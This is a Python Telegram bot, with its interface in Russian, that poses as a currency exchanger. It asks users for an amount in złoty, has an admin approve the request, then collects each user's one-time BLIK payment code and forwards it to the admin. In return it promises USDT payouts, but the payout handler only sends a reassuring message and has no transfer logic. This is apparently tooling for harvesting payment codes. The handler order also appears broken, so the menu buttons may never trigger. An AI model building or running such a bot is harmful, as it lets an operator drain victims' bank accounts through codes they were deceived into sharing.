import os
import json
import dotenv
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)

dotenv.load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
DATA_FILE = "data.json"

if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, ensure_ascii=False, indent=4)

def load_data():
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

menu_keyboard = ReplyKeyboardMarkup(
    [["💰 Выплатить баланс", "⚙️ Сменить адрес USDT"],
     ["💳 Отправить BLIK-код", "📞 Поддержка"]],
    resize_keyboard=True
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = load_data()
    if str(user.id) not in data:
        data[str(user.id)] = {
            "username": user.username,
            "balance": 0,
            "usdt_address": None,
            "pending": None
        }
        save_data(data)

    await update.message.reply_text(
        f"👋 Привет, {user.first_name}!\n"
        "Добро пожаловать в обменник.\n\n"
        "Выберите действие из меню ниже 👇",
        reply_markup=menu_keyboard
    )

async def payout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💸 Ваши средства будут выплачены на ваш кошелёк USDT (TRC20) "
        "в ближайшее время."
    )

async def change_usdt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📩 Пришлите свой адрес USDT (TRC20):"
    )
    context.user_data["awaiting_usdt"] = True

async def send_blik(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💰 Введите сумму в PLN:")
    context.user_data["awaiting_amount"] = True

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📬 Поддержка: [@phoenlx_black](https://t.me/phoenlx_black)",
        parse_mode="Markdown"
    )

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Доступ запрещён.")
        return

    keyboard = [
        [InlineKeyboardButton("👥 Пользователи", callback_data="list_users")],
        [InlineKeyboardButton("💸 Балансы", callback_data="list_balances")],
        [InlineKeyboardButton("📜 История заявок", callback_data="list_pending")]
    ]
    await update.message.reply_text(
        "👑 Панель администратора",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    data = load_data()

    if context.user_data.get("awaiting_usdt"):
        address = update.message.text.strip()
        if not (address.startswith("T") and len(address) == 34):
            await update.message.reply_text("⚠️ Неверный формат TRC20-адреса.")
            return
        data[user_id]["usdt_address"] = address
        save_data(data)
        context.user_data.pop("awaiting_usdt")
        await update.message.reply_text(f"✅ Адрес сохранён: {address}")
    elif context.user_data.get("awaiting_amount"):
        try:
            amount = float(update.message.text)
            data[user_id]["pending"] = {
                "amount": amount,
                "status": "ожидание подтверждения"
            }
            save_data(data)
            context.user_data.pop("awaiting_amount")

            keyboard = [
                [InlineKeyboardButton("✅ Разрешить ввод BLIK", callback_data=f"allow_{user_id}")],
                [InlineKeyboardButton("❌ Отклонить", callback_data=f"deny_{user_id}")]
            ]
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"💳 Заявка от @{user.username or 'Без ника'}\n"
                     f"Сумма: {amount} PLN\n"
                     f"ID: {user_id}",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            await update.message.reply_text("⌛ Заявка отправлена администратору на подтверждение.")
        except ValueError:
            await update.message.reply_text("⚠️ Введите корректную сумму.")
    elif context.user_data.get("awaiting_blik"):
        code = update.message.text.strip()
        amount = data[user_id]["pending"]["amount"]

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📨 Новый BLIK-код от @{user.username or 'Без ника'}\n"
                 f"💰 Сумма: {amount} PLN\n"
                 f"🔢 Код: {code}\n"
                 f"ID: {user_id}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Принять", callback_data=f"accept_{user_id}")],
                [InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{user_id}")]
            ])
        )
        await update.message.reply_text("📩 Код отправлен администратору.")
        context.user_data.pop("awaiting_blik", None)
    else:
        await update.message.reply_text("⚠️ Выберите действие из меню.")

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = load_data()
    await query.answer()

    if not query.data:
        return

    if query.data.startswith("allow_"):
        uid = query.data.split("_")[1]
        await context.bot.send_message(
            chat_id=int(uid),
            text="✅ Администратор разрешил вводить BLIK-код.\nОтправьте его сюда:"
        )
        await query.edit_message_text("✅ Разрешено вводить BLIK.")
    elif query.data.startswith("deny_"):
        uid = query.data.split("_")[1]
        await context.bot.send_message(chat_id=int(uid), text="❌ Ваша заявка отклонена.")
        await query.edit_message_text("❌ Заявка отклонена.")
    elif query.data.startswith("accept_"):
        uid = query.data.split("_")[1]
        data[uid]["balance"] += data[uid]["pending"]["amount"]
        data[uid]["pending"]["status"] = "одобрено"
        save_data(data)
        await context.bot.send_message(chat_id=int(uid), text="✅ Код принят, баланс обновлён.")
        await query.edit_message_text("✅ Код принят.")
    elif query.data.startswith("reject_"):
        uid = query.data.split("_")[1]
        data[uid]["pending"]["status"] = "отклонено"
        save_data(data)
        await context.bot.send_message(chat_id=int(uid), text="❌ Код отклонён.")
        await query.edit_message_text("❌ Код отклонён.")
    elif query.data == "list_users":
        text = "👥 Пользователи:\n"
        for uid, info in data.items():
            text += f"• @{info.get('username', 'Без ника')} (ID: {uid})\n"
        await query.edit_message_text(text or "Нет пользователей.")
    elif query.data == "list_balances":
        text = "💸 Балансы:\n"
        for uid, info in data.items():
            text += f"@{info.get('username', 'Без ника')} — {info.get('balance', 0):.2f} PLN\n"
        await query.edit_message_text(text or "Балансы пусты.")
    elif query.data == "list_pending":
        text = "📜 История заявок:\n"
        for uid, info in data.items():
            p = info.get("pending")
            if p:
                text += f"@{info.get('username', 'Без ника')} — {p['amount']} PLN ({p['status']})\n"
        await query.edit_message_text(text or "Нет заявок.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Regex("💰 Выплатить баланс"), payout))
    app.add_handler(MessageHandler(filters.Regex("⚙️ Сменить адрес USDT"), change_usdt))
    app.add_handler(MessageHandler(filters.Regex("💳 Отправить BLIK-код"), send_blik))
    app.add_handler(MessageHandler(filters.Regex("📞 Поддержка"), support))
    print("✅ Бот запущен...")
    app.run_polling()

if __name__ == "__main__":
    main()
